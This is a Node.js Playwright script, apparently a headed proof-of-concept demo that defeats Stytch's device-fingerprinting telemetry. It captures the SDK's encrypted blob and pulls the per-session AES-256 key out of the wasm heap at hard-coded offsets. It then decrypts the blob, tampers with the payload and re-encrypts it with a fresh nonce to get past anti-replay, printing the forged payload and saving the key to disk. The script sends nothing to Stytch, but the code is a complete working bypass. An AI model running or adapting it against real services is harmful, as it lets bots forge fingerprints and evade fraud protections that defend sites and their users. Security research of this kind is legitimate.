#!/usr/bin/env node
/**
 * stytch-dfp-tamper-visual.mjs — HEADED (visible) tamper-and-reship demo.
 *
 * Same chain as stytch-dfp-tamper.mjs, but the browser is visible and a live
 * terminal-style panel on the page shows each step as it happens:
 *   load SDK → capture real blob → read per-session AES key from heap →
 *   decrypt (magic 8e3421f0) → TAMPER → re-encrypt with FRESH nonce →
 *   prove server-side re-decrypt → dump would-be-sent payload.
 *
 * Nothing is sent to Stytch — the SDK posts to a LOCAL /submit that is
 * intercepted and never forwarded. Telemetry.js is still fetched from
 * elements.stytch.com (public asset) so the bundle is the real one.
 *
 * Usage:
 *   node bots/stytch-dfp-tamper-visual.mjs
 *   (keep the browser open; close the window to exit)
 */
import { chromium } from 'playwright';
import { createServer } from 'node:http';
import { randomBytes } from 'node:crypto';
import { createCipheriv, createDecipheriv } from 'node:crypto';
import { mkdirSync, writeFileSync } from 'node:fs';

const PORT = 8860;

// ---------------------------------------------------------------------------
// Page: terminal-style control panel + RUN button, live log via window.__log
// ---------------------------------------------------------------------------
const html = `<!doctype html>
<html><head><meta charset="utf-8"><title>Stytch DFP — tamper-and-reship (live)</title>
<style>
  body{background:#0d1117;color:#e6edf3;font-family:ui-monospace,Menlo,Consolas,monospace;margin:0}
  #wrap{max-width:980px;margin:0 auto;padding:24px}
  h1{font-size:18px;color:#58a6ff;margin:0 0 4px}
  .sub{color:#8b949e;font-size:12px;margin:0 0 16px}
  #log{background:#010409;border:1px solid #30363d;border-radius:8px;padding:14px 16px;
       font-size:12.5px;line-height:1.55;height:420px;overflow-y:auto;white-space:pre-wrap;word-break:break-all}
  .ok{color:#3fb950}.warn{color:#d29922}.bad{color:#f85149}.dim{color:#8b949e}.acc{color:#58a6ff}.big{color:#a5d6ff;font-weight:bold}
  button{background:#238636;color:#fff;border:none;border-radius:6px;padding:10px 22px;font-size:14px;
         cursor:pointer;margin:14px 0 6px;font-family:inherit}
  button:disabled{background:#30363d;color:#8b949e;cursor:default}
  .tag{display:inline-block;min-width:120px;color:#8b949e}
  .hex{color:#d2a8ff}
</style></head>
<body><div id="wrap">
  <h1>Stytch Device Fingerprinting — live tamper-and-reship PoC</h1>
  <p class="sub">client-side only · telemetry.js loaded from elements.stytch.com · SDK posts to a LOCAL /submit (intercepted, never forwarded)</p>
  <button id="go">▶ RUN</button>
  <div id="log"></div>
  <p class="sub" id="foot"></p>
</div>
<script src="https://elements.stytch.com/telemetry.js"></script>
<script>
window.__m=null; window.__n=0;
window.__log=function(cls, line){ const el=document.getElementById('log');
  const d=document.createElement('div'); d.className=cls||'';
  const t=String(new Date().getTime()).slice(-6); d.textContent='['+t+'] '+line;
  el.appendChild(d); el.scrollTop=el.scrollHeight; };
const _orig=window.telemetryjs;
window.telemetryjs=function(...a){ const r=_orig.apply(this,a);
  if(r&&typeof r.then==='function') return r.then(m=>{window.__m=m;return m;});
  window.__m=r; return r; };
window.__run=async()=>{
  document.getElementById('go').disabled=true;
  try{
    window.__log('acc','[*] telemetryjs() -> resolving module (C++/Emscripten wasm2js) …');
    const m=await window.telemetryjs(); window.__m=m;
    window.__log('ok','[+] module resolved; awaiting Ready …');
    await m.Ready; m.rids=[];
    window.__log('acc','[*] GetTID() → SDK builds blob and POSTs to http://127.0.0.1:'+${PORT}+'/submit');
    await m.GetTID({a:'public-token-test',b:'http://127.0.0.1:'+${PORT}+'/submit',c:'UNKNOWN',d:v=>{window.__tid=v;}});
    window.__log('ok','[+] GetTID returned; telemetry POST intercepted (not forwarded)');
    window.__n=1;
  }catch(e){ window.__log('bad','[!] '+String(e).slice(0,200)); }
};
document.getElementById('go').onclick=window.__run;
</script></body></html>`;

// ---------------------------------------------------------------------------
// Local server: serves the page; /submit is never reached by Stytch
// ---------------------------------------------------------------------------
const server = createServer((req,res)=>{
  if (req.url === '/') { res.writeHead(200,{'content-type':'text/html'}); res.end(html); }
  else if (req.url === '/submit') {
    let b=[]; req.on('data',c=>b.push(c));
    req.on('end',()=>{ res.writeHead(200,{'content-type':'text/plain'}); res.end('00000000-0000-4000-8000-000000000000'); });
  } else { res.writeHead(200,{'content-type':'text/plain'}); res.end('ok'); }
});
await new Promise(r=>server.listen(PORT,'127.0.0.1',r));

// ---------------------------------------------------------------------------
// Browser (HEADED — visible window on DISPLAY=:1)
// ---------------------------------------------------------------------------
const browser = await chromium.launch({ headless:false, args:['--window-size=1024,900','--start-maximized'] });
const ctx = await browser.newContext({ viewport:{ width:960, height:820 } });
const page = await ctx.newPage();

const L = cls => txt => page.evaluate(([c,t])=>window.__log(c,t), [cls,txt]).catch(()=>{});
const step = async (cls, txt)=>{ await L(cls)(txt); await new Promise(r=>setTimeout(r,650)); };
const sleep = ms => new Promise(r=>setTimeout(r,ms));

let captured = null;                       // real blob (base64 text from SDK)
await page.route('**/submit', async route => {
  const buf = route.request().postDataBuffer();
  captured = buf;
  await route.fulfill({ status:200, contentType:'text/plain', body:'00000000-0000-4000-8000-000000000000' });
});
await page.route('**/errors', r => r.fulfill({ status:200, contentType:'text/plain', body:'ok' }));

await page.goto(`http://127.0.0.1:${PORT}/`, { waitUntil:'load' });
await page.waitForFunction(()=>typeof window.telemetryjs==='function', { timeout:15000 }).catch(()=>{});
await L('dim')('[*] SDK loaded · waiting for you to press RUN …');

// wait for the user to press RUN (window.__n flips to 1), up to 5 minutes
let waited = 0;
while (true) {
  const n = await page.evaluate(()=>window.__n).catch(()=>0);
  if (n) break;
  if (waited > 300) { await L('bad')('[!] timed out waiting for RUN — closing'); break; }
  await sleep(1000); waited++;
}

// ---------------------------------------------------------------------------
// 1. capture real blob  → 2. read per-session AES-256 key from module heap
// ---------------------------------------------------------------------------
if (!captured) {
  await L('bad')('[!] no telemetry blob captured');
} else {
  await step('acc','[*] capture: real blob captured at the network layer');
  await step('dim','    base64 len '+captured.length+' → decoded '+Buffer.from(captured.toString('utf8'),'base64').length+' bytes');

  const caps = await page.evaluate(() => {
    const u8 = window.__m && window.__m.HEAPU8; if(!u8) return {err:'no module'};
    const u32 = o => u8[o]|(u8[o+1]<<8)|(u8[o+2]<<16)|(u8[o+3]<<24);
    const C = u32(17349*4);
    const b64 = a => { const CH=8192,p=[]; for(let i=0;i<a.length;i+=CH)p.push(String.fromCharCode.apply(null,a.subarray(i,i+CH))); return btoa(p.join('')); };
    return { C, c96: b64(u8.slice(C+96,C+128)), tab: b64(u8.slice(8304,8336)) };
  }).catch(e=>({err:String(e)}));

  if (caps.err) { await L('bad')('[!] key extraction failed: '+caps.err); }
  else {
    await step('acc','[*] read per-session AES-256 key from the module heap');
    await L('dim')('    C   = u32(HEAPU8[17349*4]) = '+caps.C);
    const key = Buffer.alloc(32);
    { const c96 = Buffer.from(caps.c96,'base64'), tab = Buffer.from(caps.tab,'base64');
      for (let i=0;i<32;i++) key[i] = c96[i] ^ tab[i]; }
    await L('ok')('    key = HEAPU8[C+96..C+128] XOR HEAPU8[8304..8336]');
    await L('hex')('    KEY = '+key.toString('hex'));

    // 3. decrypt the REAL blob
    const realBlob = Buffer.from(captured.toString('utf8'),'base64');
    const iv0 = realBlob.subarray(64,80);
    const d = createDecipheriv('aes-256-cbc', key, iv0);
    const realPlain = Buffer.concat([d.update(realBlob.subarray(80)), d.final()]);
    const pad = realPlain[realPlain.length-1];
    const realBody = pad && pad<=16 ? realPlain.subarray(0, realPlain.length-pad) : realPlain;

    await step('ok','[+] AES-256-CBC decrypt (iv = nonce @blob[64:80])');
    await L('dim')('    nonce = '+iv0.toString('hex'));
    await L('ok')('    magic = '+realBody.subarray(0,4).toString('hex')+'  (expect 8e3421f0) ✓');
    await L('dim')('    session block[4:68] = '+realBody.subarray(4,20).toString('hex')+'…');
    await L('dim')('    payload len = '+(realBody.length-68)+' bytes');

    // 4. TAMPER
    await step('bad','[*] TAMPER: stamp marker at payload[0:16] + flip byte @200');
    const tampered = Buffer.from(realBody);
    const marker = Buffer.from('TAMPERED_PAYLOAD!','utf8');
    marker.copy(tampered, 68, 0, Math.min(marker.length, tampered.length-68));
    if (tampered.length > 200) tampered[200] ^= 0xff;
    await L('dim')('    before payload[68:96]  '+realBody.subarray(68,96).toString('hex'));
    await L('bad')('    after  payload[68:96]  '+tampered.subarray(68,96).toString('hex'));

    // 5. re-encrypt with a FRESH nonce
    await step('acc','[*] re-encrypt with the SAME key + FRESH random nonce (anti-replay only blocks verbatim replay)');
    const newNonce = randomBytes(16);
    const e = createCipheriv('aes-256-cbc', key, newNonce);
    const newCt = Buffer.concat([e.update(tampered), e.final()]);
    const tamperedBlob = Buffer.concat([ realBlob.subarray(0,64), newNonce, newCt ]);
    await L('hex')('    NEW nonce = '+newNonce.toString('hex'));
    await L('dim')('    tampered blob = '+tamperedBlob.length+' bytes (session block reused, unchanged)');

    // 6. prove server-side re-decrypt
    const d2 = createDecipheriv('aes-256-cbc', key, newNonce);
    const tPlain = Buffer.concat([d2.update(newCt), d2.final()]);
    const tPad = tPlain[tPlain.length-1];
    const tBody = tPad && tPad<=16 ? tPlain.subarray(0, tPlain.length-tPad) : tPlain;
    await step('ok','[+] server-side decrypt of the tampered blob:');
    await L('ok')('    magic '+tBody.subarray(0,4).toString('hex')+' · payload[0:16] = "'+tBody.subarray(68,84).toString('latin1')+'" (TAMPERED)');

    // 7. dump would-be-sent payload
    await step('acc','========== WOULD-BE-SENT PAYLOAD (nothing shipped) ==========');
    await L('dim')('method: POST · url: <real submit URL> · content-type: text/plain');
    const b64 = tamperedBlob.toString('base64');
    for (let i=0;i<b64.length;i+=96) await L('hex')(b64.slice(i,i+96));
    await step('dim','———— done — press Ctrl-C or close the window to exit —————');

    mkdirSync('/tmp/opencode/stytch',{recursive:true});
    writeFileSync('/tmp/opencode/stytch/vis-blob.bin', realBlob);
    writeFileSync('/tmp/opencode/stytch/vis-tampered-blob.bin', tamperedBlob);
    writeFileSync('/tmp/opencode/stytch/vis-key.hex', key.toString('hex')+'\n');
  }
}

// keep the browser open for the user to inspect; close the window to exit
browser.on('disconnected', ()=> process.exit(0));
await new Promise(()=>{});   // run forever until the window closes
